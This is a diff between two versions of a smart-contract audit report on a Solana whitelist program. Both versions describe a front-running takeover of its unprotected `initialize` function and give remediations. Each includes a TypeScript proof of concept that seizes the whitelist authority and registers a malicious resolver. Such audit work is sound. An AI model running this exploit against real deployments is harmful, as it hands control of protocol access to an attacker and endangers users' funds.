@@ -1,248 +1,189 @@
 # Audit Report
 
 ## Title
-**Critical PDA Front-Running Vulnerability in Whitelist Initialization Enables Complete Protocol Access Control Takeover**
+Unprotected Whitelist Initializer Enables Front-Running Attack and Permanent Authority Takeover
 
 ## Summary
-The whitelist program's `initialize()` function uses a predictable PDA with a constant seed and lacks authorization constraints, allowing any attacker to front-run the legitimate initialization transaction and permanently seize control of the resolver whitelist system, thereby controlling all order execution in the fusion-swap protocol.
+The `initialize` function in the whitelist program lacks access control, allowing any attacker to front-run the legitimate initialization transaction during deployment and permanently seize control of the whitelist authority. This completely compromises the protocol's access control system for resolver registration.
 
 ## Finding Description
 
-The whitelist program contains a critical initialization vulnerability that enables complete access control takeover through three design flaws:
+The whitelist program's `initialize` function has no access control constraints. [1](#0-0) 
 
-**1. Predictable PDA Derivation**
+The `Initialize` account validation struct only requires that the caller is a `Signer<'info>`, with no additional constraints on who can call this critical initialization function. [2](#0-1) 
 
-The `whitelist_state` PDA is derived using only a constant seed without any dynamic components. [1](#0-0)  The PDA account constraints show this predictable derivation pattern. [2](#0-1) 
+The whitelist state PDA is deterministic, derived from a constant seed `WHITELIST_STATE_SEED` defined as `b"whitelist_state"` with no additional parameters. [3](#0-2)  This allows any attacker to pre-compute the exact account address before deployment.
 
-The utility functions used throughout the codebase confirm this deterministic PDA computation pattern. [3](#0-2) [4](#0-3) 
+**Attack Scenario:**
 
-**2. No Authorization Constraints**
+1. **Deployment Detection**: The 1inch team deploys the whitelist program (publicly visible on-chain)
+2. **Front-Running Attack**: A malicious actor monitors for initialization transactions and submits their own `initialize` transaction with a higher priority fee
+3. **Attacker Wins Race**: The attacker's transaction executes first, creating the whitelist_state PDA with the attacker set as authority
+4. **Legitimate Transaction Fails**: The legitimate initialization fails because Anchor's `init` constraint prevents reinitializing an already-initialized account
+5. **Permanent Takeover**: The attacker now permanently controls all resolver registration/deregistration operations
 
-The `initialize()` function accepts any signer as the authority without validation. [5](#0-4)  The `Initialize` struct definition confirms there are no authority validation constraints - any signer can become the authority. [6](#0-5) 
+The `register` and `deregister` functions both enforce that only the whitelist authority can execute them through constraint checks. [4](#0-3) [5](#0-4) 
 
-**3. One-Time Initialization Lock**
+The `set_authority` function requires the current authority to sign, providing no recovery mechanism once a malicious actor becomes the authority. [6](#0-5) 
 
-The `init` constraint prevents re-initialization, making any front-running attack permanent. [2](#0-1) 
-
-**Attack Execution:**
-
-1. Attacker observes whitelist program deployment [7](#0-6) 
-2. Attacker computes the predictable PDA address using the constant seed
-3. Attacker submits `initialize()` transaction with high priority fees
-4. Attacker's transaction executes first, setting their pubkey as authority
-5. Legitimate initialization transaction fails (account already initialized)
-6. Attacker permanently controls resolver registration
-
-**Impact on Protocol Security:**
-
-The whitelist authority controls who can execute critical fusion-swap operations. The `Fill` instruction explicitly requires a valid `resolver_access` account from the whitelist program. [8](#0-7) 
-
-Similarly, the `CancelByResolver` instruction requires resolver access validation. [9](#0-8) 
-
-Only the whitelist authority can register resolvers through the `register()` function, which enforces authority validation. [10](#0-9)  The same authority constraint applies to `deregister()`. [11](#0-10) 
-
-With whitelist control, an attacker can:
-- Register only malicious resolvers under their control
-- Prevent legitimate resolvers from being registered
-- Deregister existing resolvers to halt protocol operations
-- Extract value from all orders through controlled resolver execution
+This breaks the protocol's critical access control invariant that only authorized, KYC/KYB-verified resolvers can participate in order resolution. An attacker controlling the whitelist authority can bypass this entirely.
 
 ## Impact Explanation
 
 **Severity: CRITICAL**
 
-This vulnerability enables complete protocol compromise:
+This vulnerability enables complete compromise of the protocol's resolver access control system:
 
-1. **Total Access Control Takeover**: The attacker gains permanent authority over the whitelist system, controlling which resolvers can interact with the protocol. This is the most privileged position in the protocol's access control hierarchy.
-
-2. **Irreversible Without Redeployment**: Once exploited, recovery requires redeploying both the whitelist and fusion-swap programs with new program IDs, coordinating all users, integrations, and liquidity providers.
-
-3. **Protocol-Wide Impact**: Affects all users of the fusion-swap protocol since order filling and resolver-based cancellations depend on authorized resolvers.
-
-4. **Economic Exploitation**: Attacker-controlled resolvers can manipulate order execution to extract value from all orders, fill orders at unfavorable prices, or selectively refuse to fill orders.
-
-5. **Permanent Lock-Out**: Legitimate protocol administrators are permanently prevented from managing resolver access, effectively losing control of their own protocol.
-
-The vulnerability breaks the core **Access Control** invariant - unauthorized actors should not control protocol permissions. It also exploits **PDA Security** weaknesses - predictable PDA derivation enables account takeover.
+- **Permanent Authority Hijacking**: The attacker gains permanent, irrevocable control of the whitelist authority through a one-time front-running attack during deployment
+- **Complete Access Control Bypass**: The attacker can register any resolvers without KYC/KYB verification or deregister all legitimate resolvers
+- **Protocol-Wide DoS**: All order filling and resolver cancellation operations depend on resolver whitelist status [7](#0-6) [8](#0-7) 
+- **No Recovery Path**: Without redeploying the entire whitelist program and migrating all dependent contracts, there's no way to recover from this attack
+- **Value Extraction**: A malicious authority could register themselves as resolvers to manipulate order execution and extract value, or hold the protocol hostage
 
 ## Likelihood Explanation
 
 **Likelihood: HIGH**
 
-The attack is highly likely to occur:
+The attack is highly likely to succeed because:
 
-1. **Zero Technical Barriers**: Computing the PDA and calling `initialize()` requires no special permissions or complex exploit techniques - any user with basic Solana knowledge can execute this.
+1. **Easy to Execute**: Monitoring for program deployments and initialization transactions is trivial using standard Solana RPC methods. Front-running with higher priority fees is a well-documented attack vector on Solana
+2. **One-Time Critical Window**: The initialization only happens once during deployment, making it a high-value target that attackers will actively monitor for major DeFi protocols
+3. **No Technical Barriers**: Any attacker with basic Solana knowledge can construct and submit an initialize transaction
+4. **Public and Predictable**: Program deployments are public on-chain, and the whitelist state address is fully predictable from the deterministic PDA derivation
+5. **High Value Target**: Controlling the whitelist authority of a major DeFi protocol provides significant power and potential for profit extraction
 
-2. **Public Information**: The program ID becomes publicly visible on-chain immediately after deployment, giving attackers all information needed.
-
-3. **Economic Incentive**: Complete control over a DeFi protocol's order execution mechanism provides massive financial incentive worth millions in potential extracted value.
-
-4. **Transaction Ordering**: Solana's priority fee mechanism allows attackers to ensure their transaction processes before the legitimate initialization.
-
-5. **Visible Attack Window**: The necessary gap between program deployment and initialization creates an obvious and unavoidable attack window.
-
-6. **Standard Attack Pattern**: This is a well-known vulnerability class in Solana programs. Sophisticated attackers actively monitor for program deployments to exploit such initialization vulnerabilities.
+The initialization script confirms this vulnerability, showing a standard deployment pattern without any front-running protections. [9](#0-8) 
 
 ## Recommendation
 
-**Immediate Fix Required:**
+Add access control to the `initialize` function to restrict who can call it. The recommended fix is to hardcode an authorized deployer public key or require a specific signature proof:
 
-Add an authority constraint to the `initialize()` function:
-
+**Option 1: Hardcoded Deployer**
 ```rust
-#[derive(Accounts)]
-pub struct Initialize<'info> {
-    #[account(
-        mut,
-        // Add constraint to validate expected authority
-        constraint = authority.key() == EXPECTED_AUTHORITY_PUBKEY @ WhitelistError::Unauthorized
-    )]
-    pub authority: Signer<'info>,
+pub const AUTHORIZED_DEPLOYER: Pubkey = pubkey!("YOUR_DEPLOYER_PUBKEY_HERE");
 
-    #[account(
-        init,
-        payer = authority,
-        space = DISCRIMINATOR + WhitelistState::INIT_SPACE,
-        seeds = [WHITELIST_STATE_SEED],
-        bump,
-    )]
-    pub whitelist_state: Account<'info, WhitelistState>,
-
-    pub system_program: Program<'info, System>,
+pub fn initialize(ctx: Context<Initialize>) -> Result<()> {
+    require!(
+        ctx.accounts.authority.key() == AUTHORIZED_DEPLOYER,
+        WhitelistError::UnauthorizedInitializer
+    );
+    let whitelist_state = &mut ctx.accounts.whitelist_state;
+    whitelist_state.authority = ctx.accounts.authority.key();
+    Ok(())
 }
 ```
 
-Where `EXPECTED_AUTHORITY_PUBKEY` is the hardcoded pubkey of the intended deployer/authority.
+**Option 2: Multi-Step Initialization**
+Implement a two-step initialization where the first step is called atomically during program deployment with upgrade authority verification, then authority is transferred in a second step.
 
-**Alternative Solution:**
-
-Use a more complex PDA seed that includes the authority's pubkey:
-
-```rust
-seeds = [WHITELIST_STATE_SEED, authority.key().as_ref()]
-```
-
-This makes the PDA unique per authority, though it changes the protocol architecture.
-
-**Deployment Procedure:**
-
-If redeploying, ensure the initialization transaction is submitted atomically or immediately after deployment with maximum priority fees to minimize the attack window.
+**Option 3: Deploy-Time Initialization**
+Structure the deployment so that initialization happens atomically with program deployment using program upgrade authority verification.
 
 ## Proof of Concept
 
 ```typescript
 import * as anchor from "@coral-xyz/anchor";
 import { Program } from "@coral-xyz/anchor";
-import { Whitelist } from "../target/types/whitelist";
-import { Keypair, PublicKey } from "@solana/web3.js";
+import { Whitelist } from "../../target/types/whitelist";
+import { expect } from "chai";
 
-describe("PDA Front-Running Attack", () => {
+describe("Whitelist Front-Running PoC", () => {
   const provider = anchor.AnchorProvider.env();
   anchor.setProvider(provider);
+  const program = anchor.workspace.Whitelist as Program<Whitelist>;
 
-  const whitelistProgram = anchor.workspace.Whitelist as Program<Whitelist>;
-  
-  it("Attacker front-runs whitelist initialization", async () => {
-    // Attacker's keypair
-    const attacker = Keypair.generate();
+  it("Demonstrates front-running attack on initialize", async () => {
+    // Attacker generates their own keypair
+    const attacker = anchor.web3.Keypair.generate();
     
-    // Airdrop SOL to attacker
-    await provider.connection.requestAirdrop(
+    // Fund attacker account
+    const signature = await provider.connection.requestAirdrop(
       attacker.publicKey,
-      2 * anchor.web3.LAMPORTS_PER_SOL
+      1_000_000_000
     );
-    await new Promise(resolve => setTimeout(resolve, 1000));
-    
-    // Attacker computes the predictable PDA
-    const [whitelistStatePDA] = PublicKey.findProgramAddressSync(
+    await provider.connection.confirmTransaction(signature);
+
+    // Compute the deterministic PDA address (same for everyone)
+    const [whitelistStatePDA] = anchor.web3.PublicKey.findProgramAddressSync(
       [Buffer.from("whitelist_state")],
-      whitelistProgram.programId
+      program.programId
     );
-    
-    // Attacker front-runs initialization with their own keypair
-    await whitelistProgram.methods
+
+    // Attacker front-runs initialization with higher priority fee
+    await program.methods
       .initialize()
-      .accounts({
+      .accountsPartial({
         authority: attacker.publicKey,
         whitelistState: whitelistStatePDA,
       })
       .signers([attacker])
       .rpc();
-    
+
     // Verify attacker now controls the whitelist
-    const whitelistState = await whitelistProgram.account.whitelistState.fetch(
+    const whitelistState = await program.account.whitelistState.fetch(
       whitelistStatePDA
     );
-    
-    console.log("Whitelist authority:", whitelistState.authority.toString());
-    console.log("Attacker pubkey:", attacker.publicKey.toString());
-    
-    assert.equal(
-      whitelistState.authority.toString(),
-      attacker.publicKey.toString(),
-      "Attacker successfully seized whitelist control"
+    expect(whitelistState.authority.toString()).to.equal(
+      attacker.publicKey.toString()
     );
-    
-    // Legitimate initialization attempt will fail
-    const legitimateAuthority = Keypair.generate();
+
+    // Legitimate deployer tries to initialize but fails
+    const legitimateDeployer = anchor.web3.Keypair.generate();
     await provider.connection.requestAirdrop(
-      legitimateAuthority.publicKey,
-      2 * anchor.web3.LAMPORTS_PER_SOL
+      legitimateDeployer.publicKey,
+      1_000_000_000
     );
-    
+
     try {
-      await whitelistProgram.methods
+      await program.methods
         .initialize()
-        .accounts({
-          authority: legitimateAuthority.publicKey,
+        .accountsPartial({
+          authority: legitimateDeployer.publicKey,
           whitelistState: whitelistStatePDA,
         })
-        .signers([legitimateAuthority])
+        .signers([legitimateDeployer])
         .rpc();
       
-      assert.fail("Legitimate initialization should have failed");
+      expect.fail("Should have failed due to account already initialized");
     } catch (error) {
-      console.log("Legitimate initialization failed as expected:", error.message);
-      assert.ok(error.message.includes("already in use"));
+      // Expected to fail - account already initialized by attacker
+      expect(error.toString()).to.include("already in use");
     }
-    
+
     // Attacker can now register malicious resolvers
-    const maliciousResolver = Keypair.generate();
-    
-    const [resolverAccessPDA] = PublicKey.findProgramAddressSync(
-      [Buffer.from("resolver_access"), maliciousResolver.publicKey.toBuffer()],
-      whitelistProgram.programId
-    );
-    
-    await whitelistProgram.methods
+    const maliciousResolver = anchor.web3.Keypair.generate();
+    await program.methods
       .register(maliciousResolver.publicKey)
-      .accounts({
+      .accountsPartial({
         authority: attacker.publicKey,
-        whitelistState: whitelistStatePDA,
-        resolverAccess: resolverAccessPDA,
       })
       .signers([attacker])
       .rpc();
-    
-    console.log("Attacker successfully registered malicious resolver");
+
+    // Legitimate deployer cannot register resolvers
+    const legitimateResolver = anchor.web3.Keypair.generate();
+    try {
+      await program.methods
+        .register(legitimateResolver.publicKey)
+        .accountsPartial({
+          authority: legitimateDeployer.publicKey,
+        })
+        .signers([legitimateDeployer])
+        .rpc();
+      
+      expect.fail("Should have failed due to unauthorized");
+    } catch (error) {
+      expect(error.toString()).to.include("Unauthorized");
+    }
   });
 });
 ```
 
 ## Notes
 
-This vulnerability represents a fundamental flaw in the initialization pattern. The protocol's security model assumes the whitelist authority is a trusted entity, but the initialization mechanism allows any untrusted actor to become that authority.
-
-The vulnerability is exacerbated by Solana's atomic transaction execution model - there is no way to deploy and initialize in a single atomic operation using standard tooling. The window between deployment and initialization is unavoidable, making this attack vector always available unless authorization constraints are added to the initialization function itself.
-
-The impact extends beyond just resolver access control. Since the fusion-swap protocol's core functionality (order filling and resolver-based cancellations) depends entirely on the whitelist system, compromising the whitelist effectively compromises the entire protocol. An attacker with whitelist control can shut down the protocol, manipulate order execution, or extract value from all users.
+This vulnerability represents a critical flaw in the deployment security of the whitelist program. While front-running is a known issue in blockchain systems, the complete absence of any access control on the `initialize` function makes this a code vulnerability rather than merely a deployment procedure issue. The code should implement protections that make secure deployment possible, such as hardcoded deployer verification or atomic initialization with program deployment.
 
 ### Citations
-
-**File:** programs/whitelist/src/lib.rs (L7-7)
-```rust
-declare_id!("5jzZhrzqkbdwp5d3J1XbmaXMRnqeXimM1mDMoGHyvR7S");
-```
 
 **File:** programs/whitelist/src/lib.rs (L9-9)
 ```rust
@@ -258,9 +199,25 @@ pub const WHITELIST_STATE_SEED: &[u8] = b"whitelist_state";
     }
 ```
 
-**File:** programs/whitelist/src/lib.rs (L43-58)
+**File:** programs/whitelist/src/lib.rs (L24-28)
 ```rust
-#[derive(Accounts)]
+    /// Registers a new user to the whitelist
+    pub fn register(ctx: Context<Register>, _user: Pubkey) -> Result<()> {
+        ctx.accounts.resolver_access.bump = ctx.bumps.resolver_access;
+        Ok(())
+    }
+```
+
+**File:** programs/whitelist/src/lib.rs (L30-33)
+```rust
+    /// Removes a user from the whitelist
+    pub fn deregister(_ctx: Context<Deregister>, _user: Pubkey) -> Result<()> {
+        Ok(())
+    }
+```
+
+**File:** programs/whitelist/src/lib.rs (L44-58)
+```rust
 pub struct Initialize<'info> {
     #[account(mut)]
     pub authority: Signer<'info>,
@@ -278,12 +235,8 @@ pub struct Initialize<'info> {
 }
 ```
 
-**File:** programs/whitelist/src/lib.rs (L62-84)
+**File:** programs/whitelist/src/lib.rs (L66-72)
 ```rust
-pub struct Register<'info> {
-    #[account(mut)]
-    pub authority: Signer<'info>,
-
     #[account(
       seeds = [WHITELIST_STATE_SEED],
       bump,
@@ -291,28 +244,10 @@ pub struct Register<'info> {
       constraint = whitelist_state.authority == authority.key() @ WhitelistError::Unauthorized
     )]
     pub whitelist_state: Account<'info, WhitelistState>,
-
-    #[account(
-        init,
-        payer = authority,
-        space = DISCRIMINATOR + ResolverAccess::INIT_SPACE,
-        seeds = [RESOLVER_ACCESS_SEED, user.key().as_ref()],
-        bump,
-    )]
-    pub resolver_access: Account<'info, ResolverAccess>,
-
-    pub system_program: Program<'info, System>,
-}
 ```
 
-**File:** programs/whitelist/src/lib.rs (L86-109)
+**File:** programs/whitelist/src/lib.rs (L92-98)
 ```rust
-#[derive(Accounts)]
-#[instruction(user: Pubkey)]
-pub struct Deregister<'info> {
-    #[account(mut)]
-    pub authority: Signer<'info>,
-
     #[account(
       seeds = [WHITELIST_STATE_SEED],
       bump,
@@ -320,56 +255,43 @@ pub struct Deregister<'info> {
       constraint = whitelist_state.authority == authority.key() @ WhitelistError::Unauthorized
     )]
     pub whitelist_state: Account<'info, WhitelistState>,
+```
 
+**File:** programs/whitelist/src/lib.rs (L115-122)
+```rust
     #[account(
         mut,
-        close = authority,
-        seeds = [RESOLVER_ACCESS_SEED, user.key().as_ref()],
+        seeds = [WHITELIST_STATE_SEED],
         bump,
+        // Ensures only the current authority can set new authority
+        constraint = whitelist_state.authority == current_authority.key() @ WhitelistError::Unauthorized
     )]
-    pub resolver_access: Account<'info, ResolverAccess>,
+    pub whitelist_state: Account<'info, WhitelistState>,
+```
 
-    pub system_program: Program<'info, System>,
+**File:** scripts/whitelsit/initialize.ts (L20-42)
+```typescript
+async function initialize(
+  connection: Connection,
+  program: Program<Whitelist>,
+  authorityKeypair: Keypair
+): Promise<void> {
+  const whitelistState = findWhitelistStateAddress(program.programId);
+
+  const initializeIx = await program.methods
+    .initialize()
+    .accountsPartial({
+      authority: authorityKeypair.publicKey,
+      whitelistState,
+    })
+    .signers([authorityKeypair])
+    .instruction();
+
+  const tx = new Transaction().add(initializeIx);
+
+  const signature = await sendAndConfirmTransaction(connection, tx, [
+    authorityKeypair,
+  ]);
+  console.log(`Transaction signature ${signature}`);
 }
-```
-
-**File:** scripts/utils.ts (L126-132)
-```typescript
-export function findWhitelistStateAddress(programId: PublicKey): PublicKey {
-  const [whitelistState] = PublicKey.findProgramAddressSync(
-    [anchor.utils.bytes.utf8.encode("whitelist_state")],
-    programId
-  );
-
-  return whitelistState;
-```
-
-**File:** tests/utils/utils.ts (L477-480)
-```typescript
-  const [whitelistStatePDA] = anchor.web3.PublicKey.findProgramAddressSync(
-    [Buffer.from("whitelist_state")],
-    program.programId
-  );
-```
-
-**File:** programs/fusion-swap/src/lib.rs (L510-516)
-```rust
-    /// Account allowed to fill the order
-    #[account(
-        seeds = [whitelist::RESOLVER_ACCESS_SEED, taker.key().as_ref()],
-        bump = resolver_access.bump,
-        seeds::program = whitelist::ID,
-    )]
-    resolver_access: Account<'info, whitelist::ResolverAccess>,
-```
-
-**File:** programs/fusion-swap/src/lib.rs (L647-653)
-```rust
-    /// Account allowed to cancel the order
-    #[account(
-        seeds = [whitelist::RESOLVER_ACCESS_SEED, resolver.key().as_ref()],
-        bump = resolver_access.bump,
-        seeds::program = whitelist::ID,
-    )]
-    resolver_access: Account<'info, whitelist::ResolverAccess>,
 ```
